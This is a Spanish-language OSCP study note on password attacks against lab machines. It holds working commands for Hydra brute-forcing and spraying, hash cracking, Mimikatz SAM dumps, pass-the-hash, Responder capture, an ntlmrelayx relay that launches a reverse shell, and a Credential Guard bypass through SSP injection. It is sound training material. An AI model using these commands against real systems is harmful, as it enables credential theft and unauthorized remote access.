---
tipo: modulo
modulo: 16
estado: repasado
tags:
  - oscp
  - explotacion
  - privesc
  - ad
  - windows
  - linux
fecha: 2026-10-05
---

# 16 - Password Attacks

> [!abstract] Resumen
> Descubrir y aprovechar contraseñas para acceder a cuentas/sistemas. Tres bloques:
> - **16.1 Ataques a logins de servicios de red** (online, contra el servicio): diccionario y **password spraying** con **Hydra** sobre SSH, RDP y formularios **HTTP POST**. Hacen ruido y pueden **bloquear cuentas**.
> - **16.2 Password cracking** (offline, contra el hash): encryption vs hashing, keyspace/hash rate y **tiempo de crackeo**, **Hashcat** y **John**, **reglas** para mutar wordlists, metodología, y casos reales: **KeePass** (`keepass2john`) y **passphrase de clave SSH** (`ssh2john`).
> - **16.3 Hashes de Windows**: **NTLM** (SAM) con **Mimikatz** → crackear o **Pass-the-Hash**; **Net-NTLMv2** capturado con **Responder** → crackear o **relay** (`ntlmrelayx`); y **Credential Guard** (LSAISO) + bypass con **memssp**.
> Idea clave del examen: cracking es **offline** (no bloquea cuentas, no hace ruido de red) vs ataques online que sí; si un hash NTLM no se crackea → **PtH**; si no hay privilegios para Mimikatz → **Responder** + relay.

## Conceptos clave
- **Online vs offline**: ataques a logins (Hydra) van **contra el servicio** → ruido, logs, lockout, WAF/fail2ban. Cracking va **contra el hash** robado → no toca la red ni bloquea cuentas.
- **Brute-force vs diccionario**: brute-force prueba **todas** las combinaciones (keyspace completo); diccionario solo las de una **wordlist** (`rockyou.txt`, 14M). Spraying = **1 password** contra **muchos usuarios** (evita lockout).
- **Encryption** (2 vías, con clave): simétrica (AES, misma clave) / asimétrica (RSA, par pública/privada). **Hash** (1 vía): MD5/SHA1/SHA256 → valor fijo único; crackear = hashear candidatos y comparar.
- **Keyspace** = charset^longitud. **Hash rate** = hashes/s (GPU >> CPU). **Tiempo crackeo = keyspace / hash rate**. La **longitud** crece exponencial; la **complejidad** (charset) solo polinomial → longitud protege más.
- **Salt**: bits aleatorios antes de hashear → frustra **rainbow tables**. **NTLM en SAM NO tiene salt** → vulnerable a PtH y precómputo.
- **Rule-based attack**: mutar la wordlist con **rule functions** (`c`, `$1`, `^3`...) para cumplir password policies. Humanos: mayúscula al principio, número/símbolo al final (teclas de la izquierda).
- **NTLM (NTHash)**: hash de la SAM, case-sensitive, sin salt, estático entre sesiones → **Pass-the-Hash**. LM es antiguo/débil (DES, ≤14, case-insensitive), desactivado desde Vista.
- **Net-NTLMv2 (NTLMv2)**: protocolo de **autenticación en red** (challenge-response). No se puede hacer PtH con él, pero se **captura** (Responder) y se **crackea** o **relaya**.
- **Mimikatz**: extrae hashes/plaintext de **SAM** (`lsadump::sam`) y de memoria de **LSASS** (`sekurlsa::logonpasswords`). Requiere **admin + SeDebugPrivilege**; LSASS corre como SYSTEM.
- **Credential Guard** (VBS/VSM, VTL1/LSAISO): aísla credenciales de dominio fuera del alcance de Mimikatz. Bypass: inyectar **SSP malicioso** (`misc::memssp`) para capturar plaintext en el **próximo login**.

> [!tip] Idea para el examen
> El límite: atacar autenticación no debería llevar **más de ~3 min** en ejercicios/challenge. Si tarda más, revisa comando o cambia de enfoque. Spraying con **1 password** evita lockouts. Para HTTP POST con Hydra necesitas **2 cosas**: el **body** del POST (Burp) y el **string de fallo** (acortado, sin "password"/"username"). Hashcat falló con clave SSH moderna (`aes-256-ctr`, "Token length exception") → **usa John**. NTLM no crackeable → **Pass-the-Hash**.

---

## 16.1 Ataques a logins de servicios de red (Hydra)

Ver nota → [[Hydra]]. Descomprimir rockyou primero:
```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

### SSH — diccionario a un usuario conocido
```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
# [2222][ssh] login: george  password: chocolate
```

### RDP — password spraying (1 password, muchos usuarios)
```bash
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt   # añadir users
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
# [3389][rdp] login: daniel ...  login: justin ...
```

### HTTP POST login form
Capturar con Burp el **body** del POST y el **mensaje de fallo** en el navegador:
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 \
  http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# [80][http-post-form] login: user  password: 121212
```
Formato: `"<ruta>:<body con ^USER^/^PASS^>:<string de fallo>"` (tres campos separados por `:`).

> [!warning] Los ataques online generan **mucho ruido** y pueden **bloquear cuentas** (3 intentos → lockout) en producción. **Enumera antes** para evitar tumbar sistemas críticos. Fuentes de passwords para spray: leaks (ScatteredSecrets) — cuidado legal (WeLeakInfo fue incautado por el FBI).

---

## 16.2 Fundamentos de password cracking

Ver nota → [[Password Cracking (Hashcat y John)]].

### Teoría: tiempo de crackeo
```bash
echo -n "secret1" | sha256sum       # -n = sin newline (cambiaría el hash)
echo -n "abc...XYZ0...9" | wc -c     # tamaño del charset (62)
python3 -c "print(62**8)"           # keyspace de 8 chars = 218,340,105,584,896
hashcat -b                          # benchmark: hash rate (MH/s) por algoritmo/hardware
python3 -c "print(218340105584896 / 9276300000)"   # keyspace / hashrate = segundos
```
GPU (RTX 3090) vs CPU para SHA256: **9276 MH/s vs 134 MH/s**. 8 chars ≈ 6.5 h GPU; 10 chars ≈ 2.8 años. **Longitud > complejidad**.

### Reglas (mutar wordlist)
```bash
echo \$1 > demo.rule                       # $x = append ; ^x = prepend
hashcat -r demo.rule --stdout demo.txt     # --stdout = debug: solo muestra las mutaciones
# regla en UNA línea = funciones encadenadas (izq->der): "c $1 $!" -> Password1!
# reglas en LÍNEAS distintas = reglas independientes (varias mutaciones por password)
ls /usr/share/hashcat/rules/               # reglas predefinidas (best66, rockyou-30000, dive...)
```

| Rule function | Qué hace |
|---|---|
| `c` | Capitaliza la 1ª letra (resto minúsculas) |
| `$X` / `^X` | Append / prepend del carácter `X` |

### Casos: KeePass y clave SSH
```bash
# KeePass (.kdbx) -> borrar "Database:" del hash resultante
keepass2john Database.kdbx > keepass.hash
hashcat --help | grep -i keepass           # modo 13400
hashcat -m 13400 keepass.hash rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Passphrase de clave SSH privada
ssh2john id_rsa > ssh.hash                 # $6$ = SHA-512
# Hashcat 22921 falla con aes-256-ctr -> "Token length exception" -> usar JOHN:
# añadir [List.Rules:sshRules] a /etc/john/john.conf
john --wordlist=ssh.passwords --rules=sshRules ssh.hash   # -> Umbrella137!
chmod 600 id_rsa ; ssh -i id_rsa -p 2222 dave@192.168.50.201
```

> [!important] Metodología de cracking: (1) **extraer** hashes → (2) **formatear** (`*2john`, quitar el prefijo del filename) → (3) **calcular tiempo** (keyspace/hashrate) → (4) **preparar wordlist** (reglas, policy, leaks) → (5) **atacar**. Cuidado con espacios/newlines al copiar hashes; verifica el **tipo** (`hashid`/`hash-identifier`).

---

## 16.3 Trabajando con hashes de Windows

### 16.3.1 NTLM (SAM) con Mimikatz → crackear
Ver notas → [[Mimikatz]] · [[Password Cracking (Hashcat y John)]]. No se puede copiar la SAM en caliente (lock del kernel) → Mimikatz:
```powershell
# PowerShell como Administrador
cd C:\tools ; .\mimikatz.exe
privilege::debug          # habilita SeDebugPrivilege
token::elevate            # eleva a SYSTEM
lsadump::sam              # dumpea NTLM de la SAM (offsec, nelly...)
```
```bash
hashcat --help | grep -i ntlm     # NTLM = modo 1000
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
# 3ae8...ba10:nicole1
```

### 16.3.2 Pass-the-Hash (sin crackear)
Ver nota → [[Pass-the-Hash]]. NTLM no salado y estático → autenticar con `usuario + hash`. Requiere que la cuenta sea **admin local** en el destino (y, si no es el `Administrator` local, **UAC remote restrictions** deshabilitado).
```bash
# acceso a share SMB con el hash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
# shell interactiva (LMHash:NTHash -> 32 ceros + NTLM)
impacket-psexec -hashes 00000000000000000000000000000000:7a38...964b Administrator@192.168.50.212   # shell como SYSTEM
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38...964b Administrator@192.168.50.212   # shell como el user
```

### 16.3.3 Net-NTLMv2: capturar (Responder) → crackear
Ver nota → [[Net-NTLMv2 (Responder y Relay)]]. Útil cuando somos **usuario sin privilegios** (no hay Mimikatz). Forzamos al target a autenticarse contra nuestro SMB:
```bash
sudo responder -I tap0            # levanta SMB server y captura Net-NTLMv2
```
```powershell
dir \\192.168.119.2\test          # desde el target (code exec) -> fuerza la autenticación
```
```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force    # NetNTLMv2 = modo 5600
```

### 16.3.4 Net-NTLMv2: relay (sin crackear)
Si el hash es muy complejo, **reenviarlo** a otra máquina donde el user sea admin local:
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <b64_revshell>"
nc -nvlp 8080                     # listener para la reverse shell
# en el target: dir \\KALI\test -> relay a FILES02 -> ejecuta el comando -> shell SYSTEM
```

### 16.3.5 Credential Guard y bypass con SSP (memssp)
Ver nota → [[Mimikatz]]. Con **Credential Guard** (VBS/VSM, LSASS aislado en **LSAISO/VTL1**), Mimikatz **no** saca los hashes de **dominio** (sí los locales).
```powershell
Get-ComputerInfo | Select-String CredentialGuard   # confirmar que está activo
# Bypass: inyectar SSP malicioso -> captura plaintext en el PRÓXIMO login
privilege::debug
misc::memssp                      # "Injected =)"
# tras un nuevo logon:
type C:\Windows\System32\mimilsa.log   # CORP\Administrator  QWERTY123!@#  (plaintext!)
```

> [!warning] Credential Guard **no** protege cuentas **locales** (sus NTLM siguen extraíbles). Activo por defecto en instalaciones Windows modernas, pero si la máquina se **actualizó** (no instaló limpia) con CG previamente desactivado, sigue desactivado.

---

## Ejemplo práctico
> [!example] Cadena típica Windows
> 1. Acceso a FILES01 como `gunther` (admin local). `mimikatz`: `privilege::debug` → `token::elevate` → `lsadump::sam` → hash NTLM de `Administrator`.
> 2. Mismo password de Administrator local en FILES02 → **PtH**: `smbclient --pw-nt-hash` (share) y `impacket-psexec -hashes ...` (shell SYSTEM).
> 3. Si solo somos user sin privilegios → `responder -I tap0`, forzar `dir \\KALI\test` → capturar Net-NTLMv2 → `hashcat -m 5600` o **relay** con `ntlmrelayx -t <otra> -c <revshell>`.

## Relacionado
- Técnicas: [[Hydra]] · [[Password Cracking (Hashcat y John)]] · [[Mimikatz]] · [[Pass-the-Hash]] · [[Net-NTLMv2 (Responder y Relay)]]
- Cheatsheet: [[Password Attacks]]
- Módulo previo: [[15 - Antivirus Evasion]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar **Kerberos** y autenticación de dominio a fondo (módulos de AD).
> - `hashid`/`hash-identifier`: ambigüedad MD2/MD4/MD5 — ¿cómo confirmar el tipo rápido?
> - UAC remote restrictions: ¿cómo detectar si están habilitadas antes de intentar PtH/relay con user no-Administrator?
